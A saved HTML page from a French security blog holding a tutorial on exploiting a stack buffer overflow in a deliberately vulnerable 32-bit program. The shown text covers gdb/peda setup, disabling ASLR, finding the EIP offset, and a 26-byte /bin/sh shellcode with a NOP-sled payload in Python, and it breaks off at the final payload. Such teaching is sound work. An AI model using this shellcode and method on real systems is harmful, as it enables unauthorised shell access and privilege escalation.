@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="fr">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.55.0-DEV" />
+
+    
+    
+    
+
+<title>App-Sys: Sur les traces d&#39;un buffer overflow • My Cyber Sharing</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="App-Sys: Sur les traces d&#39;un buffer overflow"/>
+<meta name="twitter:description" content="L&#39;exploitation d&#39;un buffer overflow, comment ça fonctionne ?"/>
+
+<meta property="og:title" content="App-Sys: Sur les traces d&#39;un buffer overflow" />
+<meta property="og:description" content="L&#39;exploitation d&#39;un buffer overflow, comment ça fonctionne ?" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.mycybersharing.com/cybersecu/app_sys_buffer_overflow/" />
+<meta property="article:published_time" content="2019-03-22T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2019-03-22T00:00:00&#43;00:00"/><meta property="og:site_name" content="My Cyber Sharing" />
+
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+
+
+
+
+
+<link rel="stylesheet" href="/css/hyde-hyde.css">
+<link rel="stylesheet" href="/css/custom.css">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+
+</head>
+
+
+    <body class=" ">
+    
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      <span class="site__title">
+        <a href="https://www.mycybersharing.com/">My Cyber Sharing</a>
+      </span>
+      
+        
+        
+        
+        <div class="author-image">
+          <img src="https://www.mycybersharing.com//img/avatar.png" alt="Author Image" class="img--circle img--headshot element--center">
+        </div>
+        
+      
+      
+      <p class="site__description">
+         Hack, Dev, Science... Partageons :) 
+      </p>
+    </div>
+    <div class="collapsible-menu">
+      <input type="checkbox" id="menuToggle">
+      <label for="menuToggle">My Cyber Sharing</label>
+      <div class="menu-content">
+        <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/cybersecu/">
+						<span>Cybersécu</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/about/">
+						<span>A Propos</span>
+					</a>
+				</li>
+			 
+		
+		</li>
+	</ul>
+</div>
+
+        <section class="social">
+	
+	<a href="https://twitter.com/TheHack42" rel="me" target="blank"><i class="fab fa-twitter fa-lg zoomhover" aria-hidden="true"></i></a>
+	
+	
+	
+	<a href="https://github.com/TheHack42" rel="me" target="blank"><i class="fab fa-github fa-lg zoomhover" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	<a href="https://linkedin.com/in/juliengarnier94" rel="me" target="blank"><i class="fab fa-linkedin fa-lg zoomhover" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	
+	<a href="mailto:juliengarnier94@hotmail.fr" rel="me"><i class="fas fa-at fa-lg zoomhover" aria-hidden="true"></i></a>
+	
+	
+	<a href="https://www.root-me.org/GARNIER" target="blank"><div class="rootme_logo logohover zoomhover"></div></a>
+	
+</section>
+
+      </div>
+    </div>
+    
+<div class="copyright">
+  &copy; 2019 Hack42
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a>
+  
+</div>
+
+
+<div class="builtwith">
+Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+</div>
+
+
+  </div>
+</div>
+
+        <div class="content container">
+            
+    <article>
+  <header>
+    <h1>App-Sys: Sur les traces d&#39;un buffer overflow</h1>
+    
+    
+<div class="post__meta">
+    
+    
+      <i class="fas fa-calendar-alt"></i> Mar 22, 2019
+    
+    
+    
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 16 min read
+</div>
+
+
+  </header>
+  
+  
+  <div class="post">
+    
+
+<h2 id="prérequis">Prérequis</h2>
+
+<p>Avant de commencer, il est nécessaire d&rsquo;avoir quelques bases en exploitation applicative système.<br />
+Il faut donc connaître le fonctionnement du processeur, les registres, la structure d&rsquo;un programme et surtout <strong>le fonctionnement de la pile</strong>.<br />
+Pour cela, si ce n&rsquo;est déjà fait, je vous invite à lire mon article &ldquo;<a href="/cybersecu/app_sys_start_gradually">Débuter progressivement</a>&rdquo;.</p>
+
+<h2 id="quel-est-le-principe-d-un-buffer-overflow">Quel est le principe d&rsquo;un &ldquo;buffer overflow&rdquo; ?</h2>
+
+<p>Avant de parler du &ldquo;overflow&rdquo;, nous allons déjà parler du &ldquo;buffer&rdquo;.<br />
+Un &ldquo;buffer&rdquo; en programmation est une mémoire-tampon permettant de stocker temporairement des données (chaîne de caractères, un fichier&hellip;) avant d&rsquo;être utilisées ou simplement copiée dans une autre zone mémoire. Par exemple, quand vous entrez du texte dans un programme, votre texte est placé temporairement dans un buffer (mémoire-tampon) et ensuite l&rsquo;adresse du buffer peut être envoyée à une fonction d&rsquo;impression pour l&rsquo;afficher à l&rsquo;écran.</p>
+
+<p><img src="/img/buffer.jpg" alt="buffer" /></p>
+
+<p><strong><em>Mais&hellip; c&rsquo;est quoi ce truc à la fin de mon buffer ?</em></strong><br />
+&ldquo;\x00&rdquo;, ça ? <strong>le null byte de fin de chaîne</strong>, et le &ldquo;\x&rdquo; permet d&rsquo;indiquer une valeur he<strong>x</strong>adécimale. Cet octet nul sert tout simplement à indiquer que c&rsquo;est la fin de la chaîne de caractères. Il est utilisé pour savoir quand il faut s&rsquo;arrêter de lire en mémoire. La fonction d&rsquo;impression l&rsquo;a utilisée pour afficher le texte &ldquo;Julien&rdquo; à l&rsquo;écran. Sans ce caractère nul, la fonction serait incapable de savoir quand est la fin du texte et elle continuerait à lire la suite.</p>
+
+<p>Et voilà&hellip;.. Ah oui, j&rsquo;ai failli oublier! Le &ldquo;overflow&rdquo; maintenant :)<br />
+&ldquo;Overflow&rdquo; c&rsquo;est le fait de déborder ce buffer et d&rsquo;aller écrire en dehors de l&rsquo;espace réservé à la base. De ce fait, des valeurs vont être écrasées et potentiellement provoquer des comportements anormaux voire un crash de l&rsquo;application !</p>
+
+<p><img src="/img/overflow.jpg" alt="overflow" /></p>
+
+<p><strong><em>Mais comment c&rsquo;est possible ? Si on a une taille de 10, alors ça se bloque à 10. Non ?</em></strong><br />
+Non, pas si le développeur a oublié de prendre en compte la taille du buffer. Il peut très bien demander un buffer de 10 caractères et autoriser à en écrire 20. Et là, on peut écraser 10 valeurs qui n&rsquo;étaient pas réservées à notre buffer&hellip;</p>
+
+<h2 id="pourquoi-exploiter-un-buffer-overflow">Pourquoi exploiter un &ldquo;buffer overflow&rdquo; ?</h2>
+
+<p>Pour faire planter l&rsquo;application !! Non, je plaisante ;)<br />
+L&rsquo;objectif c&rsquo;est de dévier le flux d&rsquo;exécution du programme et de pouvoir exécuter du code qui n&rsquo;était pas prévu initialement. Il y a potentiellement pleins d&rsquo;informations utiles après le buffer en question et le fait de pouvoir les réécrires peut amener à contrôler le registre d&rsquo;instruction (vous savez, le fameux registre EIP).</p>
+
+<p><strong><em>Je ferme l&rsquo;application et j&rsquo;exécute directement les commandes que je veux, pourquoi s&rsquo;embêter ?</em></strong><br />
+Parce que vous n&rsquo;avez pas forcément les droits nécessaires :p Sur une machine, il y a des services qui peuvent tourner avec des privilèges élevés ou alors des binaires possédant le flag &ldquo;suid&rdquo; et là prendre le contrôle d&rsquo;une telle application devient nettement plus intéressant.</p>
+
+<p>Le flag &ldquo;suid&rdquo; pour &ldquo;Set User ID&rdquo;, est un moyen de transférer des droits à un utilisateur sur un système Unix. Il s&rsquo;agit d&rsquo;un bit de contrôle applicable aux fichiers et permettant de lancer un programme en tant que l&rsquo;utilisateur qui possède le fichier et non en tant que celui qui lance le fichier. Certains programmes ont besoin de posséder des droits supplémentaires et le flag &ldquo;suid&rdquo; peut être la solution.</p>
+
+<p><img src="/img/suid.jpg" alt="suid" /></p>
+
+<p>Pour vérifier si un fichier possède le bit &ldquo;suid&rdquo;, il suffit simplement d&rsquo;afficher les permissions du fichier et de regarder s&rsquo;il ne possède pas la permission &ldquo;s&rdquo; à la place du &ldquo;x&rdquo;. Si c&rsquo;est le cas, alors le fichier sera exécuté avec les permissions du propriétaire. De plus, quand c&rsquo;est le cas le nom du fichier apparaîtra sur fond rouge (comme sur ma capture, mais cela va dépendre de votre distribution).</p>
+
+<p>Quelques exemples motivant un attaquant à exploiter un buffer overflow :</p>
+
+<ul>
+<li>Un service en écoute sur un port est vulnérable à un buffer overflow. Un attaquant souhaite prendre le contrôle à distance sur ce serveur (dans un premier temps). Pour cela il va forger une requête particulière afin d&rsquo;exploiter le buffer overflow en exécutant un code arbitraire qui va lui permettant d&rsquo;obtenir un reverse shell (un shell inversé).</li>
+<li>Cette fois, l&rsquo;attaquant à la main sur la machine mais ne possède pas les pleins pouvoirs. Pour les obtenir, il va exploiter un programme vulnérable à un buffer overflow et qui tourne avec des privilèges élevés afin d&rsquo;obtenir un shell possédant les pleins pouvoirs.</li>
+<li>Maintenant aucun service n&rsquo;est vulnérable et l&rsquo;attaquant n&rsquo;a pas la main sur la machine. Dans un premier temps, il va utiliser de l&rsquo;ingénierie sociale (manipulation de l&rsquo;être humain) pour réussir à faire télécharger un fichier à sa victime. Ensuite, un buffer overflow peut être exploité par l&rsquo;un des logiciels de lectures du fichier (lecteur vidéo, photo, PDF, musique&hellip;) et l&rsquo;attaquant pourra obtenir un reverse shell au moment où sa victime ouvrira le fichier. Ce genre de faille ont été présentes dans certaines versions de Adobe Reader (le lecteur de PDF).</li>
+</ul>
+
+<p>Vous voyez qu&rsquo;il y a un intérêt à exploiter un buffer overflow :) Let&rsquo;s go ??</p>
+
+<h2 id="l-utilisation-d-un-débogueur">L&rsquo;utilisation d&rsquo;un débogueur</h2>
+
+<p>Avant de commencer à décortiquer notre programme, nous avons besoin d&rsquo;un débogueur. Cette chose-là permet d&rsquo;analyser les bugs d&rsquo;un programme. Pour ça, il est capable d&rsquo;exécuter le programme pas-à-pas (ligne par ligne), d&rsquo;afficher la valeur des variables, de mettre des points d&rsquo;arrêt à des endroits stratégiques du programme&hellip; Ça permet réellement d&rsquo;analyser et contrôler l&rsquo;exécution du programme souhaité et ainsi en comprendre son fonctionnement sans être en possession du code source.</p>
+
+<p>Nous allons utliser <strong>le débogueur GDB (GNU Debugger)</strong> qui est le débogueur standard du projet GNU. Il fonctionne sur de nombreuses architectures de processeur, permet le débogage à distance (via une connexion série ou IP) et fonctionne sur de nombreux systèmes Unix.<br />
+L&rsquo;interface graphique ? une simple console :) Vous allez voir que c&rsquo;est sympa (ce n&rsquo;est pas de l&rsquo;ironie) ! On va juste devoir rajouter un petit quelque chose sur GDB pour le rendre plus accueillant.</p>
+
+<h3 id="installation-du-débogueur">Installation du débogueur</h3>
+
+<p>GDB est disponible dans la plupart des dépôts sous le nom de paquet &ldquo;gdb&rdquo;. Commencez donc par l&rsquo;installer :</p>
+
+<pre><code># Debian
+sudo apt-get install gdb
+
+# CentOS
+sudo yum install gdb
+</code></pre>
+
+<p>De base, GDB n&rsquo;est pas très pratique à utiliser. Une commande doit être tapée à chaque fois pour suivre l&rsquo;exécution du programme, visualiser les registres, la pile, aucune couleur permettant de mettre en évidence les relations, etc&hellip;</p>
+
+<p>Mais heureusement, il existe des extensions à GDB permettant de rajouter toutes ces choses-là, des commandes supplémentaires et bien plus encore ! Ici, nous allons utiliser &ldquo;peda&rdquo; pour sa simplicité et son ergonomie. Si vous avez eu l&rsquo;occasion de suivre mon premier tuto sur l&rsquo;app-système alors &ldquo;peda&rdquo; vous dira quelque chose. Pour l&rsquo;installer, rien de plus simple :</p>
+
+<pre><code>git clone https://github.com/longld/peda.git ~/peda
+echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit
+</code></pre>
+
+<p><strong><em>Source : <a href="https://github.com/longld/peda">https://github.com/longld/peda</a></em></strong></p>
+
+<p>Regardez comme il est mignon :)</p>
+
+<p><img src="/img/peda.jpg" alt="peda" /></p>
+
+<h3 id="quelques-commandes-utiles">Quelques commandes utiles</h3>
+
+<p>Pour commencer, toutes les commandes GDB possèdent une version longue et courte. Par exemple, <code>info</code> en version longue correspond à <code>i</code> en version courte, etc&hellip;</p>
+
+<table>
+<thead>
+<tr>
+<th>Commande</th>
+<th>Version courte</th>
+<th>Description</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td><code>run</code></td>
+<td>r</td>
+<td>Démarrer le programme.</td>
+</tr>
+
+<tr>
+<td><code>info functions</code></td>
+<td>i fu</td>
+<td>Afficher la liste des fonctions.</td>
+</tr>
+
+<tr>
+<td><code>break *0x... ou break *function_name</code></td>
+<td>b *0x&hellip;</td>
+<td>Pose un point d&rsquo;arrêt à une ligne définie par son adresse ou au début d&rsquo;une fonction.</td>
+</tr>
+
+<tr>
+<td><code>display/[quantité][type]x *0x...</code></td>
+<td>x/&hellip;</td>
+<td>Affiche une zone mémoire à partir de son adresse ou du nom d&rsquo;une fonction. Type : &lsquo;w&rsquo; 32 bits, &lsquo;b&rsquo; 8 bits&hellip;</td>
+</tr>
+
+<tr>
+<td><code>next [n]</code></td>
+<td>ni [n]</td>
+<td>Exécute [n] instruction(s). Par défaut, [n] est à 1. Vous pouvez donc faire &ldquo;ni&rdquo; directement.</td>
+</tr>
+
+<tr>
+<td><code>step</code></td>
+<td>si [n]</td>
+<td>Pareil que &ldquo;next&rdquo;. La différence ici c&rsquo;est qu&rsquo;on entre dans les fonctions.</td>
+</tr>
+
+<tr>
+<td><code>disassemble [a]</code></td>
+<td>disas [a]</td>
+<td>Désassembler une zone spécifique de la mémoire (affichage du code assembleur). [a] est l&rsquo;une des adresses de cette zone ou le nom d&rsquo;une fonction. Par défaut, [a] est la fonction exécutée actuellement.</td>
+</tr>
+
+<tr>
+<td><code>info break</code></td>
+<td>i b</td>
+<td>Affiche la liste des points d&rsquo;arrêt.</td>
+</tr>
+
+<tr>
+<td><code>delete [n]</code></td>
+<td>d [n]</td>
+<td>Supprime le [n] point d&rsquo;arrêt. Si pas de numéro, supprime la totalité des points d&rsquo;arrêt.</td>
+</tr>
+
+<tr>
+<td><code>pattern_create [n]</code></td>
+<td></td>
+<td>Génère un schéma facilement reconnaissable en mémoire de [n] caractères.</td>
+</tr>
+
+<tr>
+<td><code>pattern_search</code></td>
+<td></td>
+<td>Recherche le schéma précédemment généré en mémoire.</td>
+</tr>
+</tbody>
+</table>
+
+<p>Pour avoir la liste complète des commandes, les différents types d&rsquo;affichages, etc&hellip; c&rsquo;est par ici :<br />
+<a href="https://sourceware.org/gdb/onlinedocs/gdb/">https://sourceware.org/gdb/onlinedocs/gdb/</a></p>
+
+<p><strong><em>Tips : vous pouvez réexécuter la dernière commande exécutée en tapant simplement sur [Entrée].</em></strong></p>
+
+<h2 id="récupération-d-un-programme-vulnérable">Récupération d&rsquo;un programme vulnérable</h2>
+
+<p>Je vous propose de télécharger un petit programme normalement vulnérable à un buffer overflow (on va vérifier ensemble). Ce programme vous demande simplement votre prénom et vous dit bonjour.<br />
+Vous pouvez le télécharger <a href="/binary/overflow">ici</a>.</p>
+
+<p>Je ne vous donne volontairement pas le code source tout simplement parce que dans une situation réelle, vous ne l&rsquo;avez pas forcément :)<br />
+En revanche, voici la commande qui a permis de compiler le programme :</p>
+
+<pre><code>gcc overflow.c -o overflow -fno-stack-protector -z execstack -m32
+</code></pre>
+
+<p>Voici à quoi servent les différents arguments :</p>
+
+<ul>
+<li>-o <strong>[fichier]</strong> : place la sortie dans le fichier <strong>[fichier]</strong></li>
+<li>-fno-stack-protector : permets de désactiver la protection de la pile. Dans les dernières versions de GDB, cette option est activée par défaut. Pour exploiter notre buffer overflow sur la pile, c&rsquo;est mieux de la désactiver :)</li>
+<li>-z execstack : permets de rendre la pile exécutable. Vous allez comprendre pourquoi nous avons besoin de cette option par la suite.</li>
+<li>-m32 : permets de compiler le code source en 32 bits. Les adresses seront moins longues comme ça.</li>
+</ul>
+
+<p>Maintenant nous pouvons lancer le programme pour le tester :</p>
+
+<pre><code>$ ./overflow 
+Veuillez saisir votre prénom : Julien
+Bonjour Julien
+
+$
+</code></pre>
+
+<h3 id="j-ai-une-erreur">J&rsquo;ai une erreur&hellip; :(</h3>
+
+<p>Si ce n&rsquo;est pas le cas, passez à la suite.<br />
+Vous avez ce genre d&rsquo;erreur ? :</p>
+
+<pre><code>$ ./overflow
+bash: ./overflow: No such file or directory
+</code></pre>
+
+<p>Et pourtant vous avez vérifié à plusieurs reprises qu&rsquo;il n&rsquo;y avait pas d&rsquo;erreur dans le nom du fichier et ce n&rsquo;est pas le cas&hellip;<br />
+On va arranger ça. Je pourrais parier que vous avez un OS en 64 bits, non ?<br />
+Pour que votre OS puisse exécuter des binaires en 32 bits, il vous faut la bibliothèque standard C++ en version 32 bits. Pour l&rsquo;obtenir, installez simplement ce paquet :</p>
+
+<pre><code># Debian
+sudo apt-get install lib32stdc++6
+
+# CentOS
+sudo yum install libstdc++.i686
+</code></pre>
+
+<p>Ça fonctionne ? Parfait, nous allons pouvoir passer à la suite.</p>
+
+<h3 id="vérifier-la-présence-d-un-buffer-overflow">Vérifier la présence d&rsquo;un buffer overflow</h3>
+
+<p>Pour tester la présence d&rsquo;un buffer overflow, nous allons utiliser la technique des débutants. C&rsquo;est-à-dire, envoyer beaucoup d&rsquo;informations et essayer de provoquer un crash de l&rsquo;application.</p>
+
+<pre><code>$ ./overflow 
+Veuillez saisir votre prénom : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Bonjour AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Segmentation fault (core dumped)
+$
+</code></pre>
+
+<p>Ça vous voyez, c&rsquo;est très bon signe ! Nous venons de déborder le buffer réservé pour notre prénom, nous sommes allés réécrire des données présentes après le buffer et l&rsquo;application a crashée.</p>
+
+<p>L&rsquo;erreur <strong>&ldquo;Segmentation fault&rdquo;</strong> indique que l&rsquo;application a tentée d&rsquo;accéder à un emplacement mémoire qui ne lui était pas attribué. De ce fait, l&rsquo;OS a inévitablement interrompu son exécution.</p>
+
+<h2 id="comprendre-pourquoi-l-application-crash-phase-d-analyse">Comprendre pourquoi l&rsquo;application crash (phase d&rsquo;analyse)</h2>
+
+<p>L&rsquo;objectif ici c&rsquo;est de comprendre pourquoi nous avons une erreur de segmentation, où et que pourrait-on en faire.</p>
+
+<h3 id="désactiver-l-aslr">Désactiver l&rsquo;ASLR</h3>
+
+<p>Avant toutes choses, nous allons désactiver l&rsquo;ASLR (Address Space Layout Randomization). C&rsquo;est une protection de la mémoire appliquée par l&rsquo;OS et qui permet de placer de façon aléatoire les zones de données dans la mémoire virtuelle. En général, les zones concernées sont le tas, la pile et les bibliothèques partagées. Si nous laissons cette protection en place, nous allons avoir du mal à exécuter un code arbitraire via le buffer overflow.<br />
+Pour désactiver cette protection, rien de plus simple :</p>
+
+<pre><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+</code></pre>
+
+<p>La désactivation n&rsquo;est pas permanente. Au prochain redémarrage de votre machine, la protection sera à nouveau active.</p>
+
+<h3 id="dégainer-gdb">Dégainer GDB</h3>
+
+<p>C&rsquo;est partie !!<br />
+Pour charger notre programme dans GDB, il suffit simplement de faire :</p>
+
+<pre><code>$ gdb ./overflow
+</code></pre>
+
+<p>Normalement, GDB se lance et charge automatiquement l&rsquo;extension peda. Vous devriez avoir un shell &ldquo;<code>gdb-peda$</code>&rdquo;.<br />
+Nous allons lister les fonctions présentes afin d&rsquo;y voir plus clair :</p>
+
+<p><img src="/img/gdb_functions.jpg" alt="gdb_functions" /></p>
+
+<p><strong><em>Mais&hellip; il y en a beaucoup pour un simple programme !</em></strong><br />
+Toutes les fonctions commençant par un underscore ou finissants par &ldquo;@plt&rdquo; ne sont souvent pas des fonctions développées par le développeur du programme. C&rsquo;est des fonctions présentes dans des bibliothèques partagées ou qui ont été rajoutées par le compilateur permettant d&rsquo;initialiser le programme ou de le fermer proprement. Du coup ça en élimine plusieurs. Les fonctions &ldquo;&hellip;register&hellip;clones&rdquo; et &ldquo;frame_dummy&rdquo; peuvent également être ignorées.<br />
+Bon allez, voici une commande permettant d&rsquo;afficher uniquement les fonctions ne commençant pas par un underscore et ne possédant pas de &ldquo;@&rdquo; :</p>
+
+<p><img src="/img/gdb_functions_filter.jpg" alt="gdb_functions_filter" /></p>
+
+<p>La chose bizarre que j&rsquo;ai rajoutée à la fin de la commande est une expression régulière. Elle permet d&rsquo;appliquer un filtre sur le résultat.<br />
+Il nous reste la fonction &ldquo;interroger&rdquo; et &ldquo;main&rdquo; (les autres ne sont pas concernées). Dans un programme, la fonction &ldquo;main&rdquo; est la fonction principale du programme. L&rsquo;exécution du programme entraîne automatiquement l&rsquo;appel à la fonction &ldquo;main&rdquo; et ceci dès le début.</p>
+
+<p>Plaçons donc un point d&rsquo;arrêt au début de la fonction &ldquo;main&rdquo; et &ldquo;interroger&rdquo; afin d&rsquo;interrompre l&rsquo;exécution :</p>
+
+<pre><code>gdb-peda$ b *main
+Breakpoint 1 at 0x80484ba
+gdb-peda$ b *interroger
+Breakpoint 2 at 0x8048486
+</code></pre>
+
+<p>Avant de démarrer notre application, nous allons générer un pattern. C&rsquo;est simplement une chaîne de caractères facilement reconnaissable en mémoire. Au moment d&rsquo;entrer le prénom, nous allons entrer le pattern généré. Partons sur un pattern de 100 caractères :</p>
+
+<p><img src="/img/gdb_pattern.jpg" alt="gdb_functions_filter" /></p>
+
+<p>Copiez-le, il va nous servir au moment où il faudra entrer le prénom.</p>
+
+<p>Vous êtes prêt pour le décollage ? Lançons l&rsquo;application avec la commande <code>r</code> :</p>
+
+<p><img src="/img/gdb_running.jpg" alt="gdb running" /></p>
+
+<p>Le commandant de bord et l&rsquo;ensemble de l&rsquo;équipage ont le plaisir de vous accueillir à bord de <strong>GDB</strong>, compagnie membre de <strong>GNU</strong>.</p>
+
+<p>Maintenant, nous allons suivre l&rsquo;exécution du programme pas-à-pas et ceci jusqu&rsquo;à un crash. La commande <code>ni</code> va nous permettre de faire avancer le pointeur d&rsquo;exécution. À un moment donné, le programme va vous demander d&rsquo;entrer votre prénom (juste après l&rsquo;instruction <code>call ...&lt;fgets@plt&gt;</code>), collez le pattern que vous avez copié précédemment :</p>
+
+<p><img src="/img/gdb_pattern_enter.jpg" alt="gdb pattern enter" /></p>
+
+<p>Vous avez un crash ? Moi aussi :</p>
+
+<p><img src="/img/gdb_overflow_crash.jpg" alt="gdb overflow crash" /></p>
+
+<p>&ldquo;<strong><em>Invalid $PC address: 0x&hellip;&hellip;</em></strong>&rdquo;, le programme a tenté de lire du code à une adresse invalide. Pour ma part, <strong>0x41414641</strong>.<br />
+Maintenant remontez un peu plus haut dans GDB afin de voir quelle était l&rsquo;instruction précédemment exécutée :</p>
+
+<p><img src="/img/gdb_overflow_ret.jpg" alt="gdb overflow crash" /></p>
+
+<p>Un schéma s&rsquo;impose afin d&rsquo;illustrer notre situation :</p>
+
+<p><img src="/img/overflow_pattern.jpg" alt="overflow pattern" /></p>
+
+<p>Vous voyez le souci ? Nous avons réécrit la sauvegarde de EIP servant à reprendre l&rsquo;exécution de la fonction &ldquo;main&rdquo; et l&rsquo;instruction &ldquo;ret&rdquo; l&rsquo;a copiée dans le registre EIP. Le problème c&rsquo;est que cette sauvegarde a été altérée par notre pattern et ne correspond pas à une adresse valide&hellip; du coup l&rsquo;application a crashée.</p>
+
+<p><img src="/img/gdb_overflow_eip.jpg" alt="gdb overflow eip" /></p>
+
+<p>Maintenant il nous faudrait identifier à partir de combien de caractères nous atteignons cette sauvegarde afin de contrôler le registre EIP. Pour ça, la commande <code>pattern_search</code> va nous aider :</p>
+
+<p><img src="/img/gdb_pattern_search.jpg" alt="gdb pattern search" /></p>
+
+<p>C&rsquo;est <strong>à partir du 44ème caractère</strong> que nous pouvons réécrire le registre EIP.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>Contrôler le flux d&rsquo;exécution en modifiant le registre EIP c&rsquo;est une chose, ouvrir un shell s&rsquo;en est une autre&hellip; En effet, maintenant nous devons rediriger le flux d&rsquo;exécution sur une zone mémoire possédant les instructions nécessaires à l&rsquo;ouverture d&rsquo;un shell. Comme ces instructions ne sont pas présentes en mémoire, nous allons donc nous en occuper :) Nous sommes capables d&rsquo;écrire sur la pile (en entrant notre prénom), alors pourquoi ne pas écrire les instructions nécessaires dans le prénom (à la place du pattern) ?</p>
+
+<h3 id="le-shellcode">Le shellcode</h3>
+
+<p>Une suite d&rsquo;instructions sous forme de chaîne de caractères est appelé un <strong>shellcode</strong>. À l&rsquo;origine, un shellcode était destiné à ouvrir un shell. Avec le temps, le mot s&rsquo;est généralisé et maintenant nous l&rsquo;employons pour désigner tout code malveillant (pas seulement l&rsquo;ouverture d&rsquo;un shell). Vous vous souvenez de la notation &ldquo;\x&rdquo; pour écrire un caractère en hexadécimal ? Nous allons en avoir besoin pour notre shellcode.<br />
+Je vous propose celui-ci :</p>
+
+<p><code>\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80</code></p>
+
+<p>Nous allons devoir utiliser un langage de programmation tel que Python pour interpréter notre shellcode. C&rsquo;est-à-dire que chaque valeur hexadécimale va devoir être convertie en caractère. Par exemple, \x41 =&gt; &ldquo;A&rdquo;.<br />
+Tout d&rsquo;abord, essayons de comprendre ce shellcode :</p>
+
+<pre><code>0:  83 c4 32                add    esp,0x32    ; esp = esp + 50
+3:  31 c0                   xor    eax,eax     ; eax = 0
+5:  50                      push   eax         ; pousse eax sur la pile
+6:  68 2f 2f 73 68          push   0x68732f2f  ; pousse &quot;//sh&quot;
+b:  68 2f 62 69 6e          push   0x6e69622f  ; pousse &quot;/bin&quot;
+10: 89 e3                   mov    ebx,esp     ; adresse du haut de la pile dans ebx
+12: 50                      push   eax         ; pousse eax
+13: 53                      push   ebx         ; pousse ebx
+14: 89 e1                   mov    ecx,esp     ; adresse du haut de la pile dans ecx
+16: b0 0b                   mov    al,0xb      ; eax = 0xb (11) =&gt; id execve
+18: cd 80                   int    0x80        ; déclenche un syscall (appel système)
+</code></pre>
+
+<p><strong><em>Le site qui m&rsquo;a permis de convertir le shellode en assembleur est <a href="https://defuse.ca/online-x86-assembler.htm">defuse.ca</a>.<br />
+Le shellcode a été trouvé sur <a href="http://shell-storm.org/shellcode/">shell-storm.org</a>.</em></strong></p>
+
+<p>Ce code va donc effectuer l&rsquo;appel système <strong>execve</strong> qui permet d&rsquo;exécuter un programme (pour nous /bin/sh). En langage C, cela donnerait :</p>
+
+<pre><code>execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;]);
+</code></pre>
+
+<p>Les informations nécessaires pour réaliser un syscall peuvent être trouvées ici : <a href="https://w3challs.com/syscalls/?arch=x86">https://w3challs.com/syscalls/?arch=x86</a></p>
+
+<h3 id="écriture-de-l-exploit">Écriture de l&rsquo;exploit</h3>
+
+<ul>
+<li>Nous savons que pour écrire le registre EIP, il faut atteindre le <strong>44ème caractère</strong>.</li>
+<li>Nous avons en notre possession <strong>un shellcode de 26 octets</strong>.</li>
+</ul>
+
+<p>Si nous plaçons notre shellcode au début de notre payload (charge qui va être injectée au moment de rentrer le prénom), alors il va falloir rajouter <strong>18 caractères (44 - 26) pour atteindre l&rsquo;adresse de retour</strong>. Cette dernière va devoir pointer sur notre shellcode présent sur la pile.</p>
+
+<p>Pour éviter d&rsquo;avoir à mettre exactement l&rsquo;adresse de notre shellcode, nous allons utiliser une petite astuce. Plutôt que de rajouter 18 caractères inutiles après notre shellcode (obligatoire pour atteindre l&rsquo;adresse de retour), nous allons les utiliser à bons escients.<br />
+On va rajouter 18 instructions &ldquo;nop&rdquo; (ne fait aucune action) avant notre shellcode. Comme ça, il nous suffira simplement de mettre une adresse tombant dans cette suite de &ldquo;nop&rdquo; et par la suite notre shellcode sera exécuté.</p>
+
+<p>La valeur hexadécimale d&rsquo;un nop est &ldquo;\x90&rdquo;. Ce schéma illustre la forme de notre charge finale :</p>
+
+<p><img src="/img/overflow_exploit.jpg" alt="overflow exploit" /></p>
+
+<p>En Python, cela donnerait :</p>
+
+<p><code>
+print &quot;\x90&quot;*18 + &quot;\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot; + &quot;pool_address&quot;
+</code></p>
+
+<p>Pour calculer l&rsquo;adresse du pool, il suffit simplement de récupérer l&rsquo;adresse du haut de la pile au moment du &ldquo;ret&rdquo; et d&rsquo;enlever 44 (0x2c).</p>
+
+<p><img src="/img/overflow_pool_address.jpg" alt="overflow pool address" /></p>
+
+<p>Pour être tranquille, je ne vais pas prendre exactement le début du pool mais un peu après. Ma charge finale donne donc :</p>
+
+<p><code>
